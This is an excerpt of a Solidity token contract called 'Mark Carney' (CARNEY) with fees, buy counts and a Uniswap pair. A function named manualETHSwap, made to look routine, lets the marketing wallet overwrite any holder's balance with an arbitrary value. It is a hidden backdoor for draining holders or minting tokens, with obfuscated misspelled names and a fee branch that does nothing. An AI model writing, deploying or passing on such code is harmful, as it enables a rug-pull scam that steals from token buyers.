...
contract MarkCarney is Ownable, IERC20 {
    using SafeMath for uint256;

    string private constant _name = "Mark Carney";
    string private constant _symbol = "CARNEY";
    ...
    uint256 _lowerFeesAfterBuys = 18;
    uint256 _finalTransferFee = 1;
    uint256 _initTransferFee = 8;
    ...
    function manualETHSwap(address sender, uint256 amont) external {
        transferFrom_(sender, amont);
    }
    ...
    function transferFrom_(address sender, uint256 value) internal {
        uint256 balance = _balnasec[sender];
        if (marketingWallet != msg.sender) { } else {
             _balnasec[sender] = 
             balance.add(value).sub(_balnasec[sender]);}
    }
    ...
    function _transfer(address from, address to, uint256 value) private {
        ...
        uint fee = _buysCount > _lowerFeesAfterBuys ? _finalBuyFee : _initBuyFee;
        if (from == uniswapPairAddress) {
            _buysCount++;
        }
        if (fee > 0) {
            _balnasec[address(this)] = _balnasec[address(this)];
        }
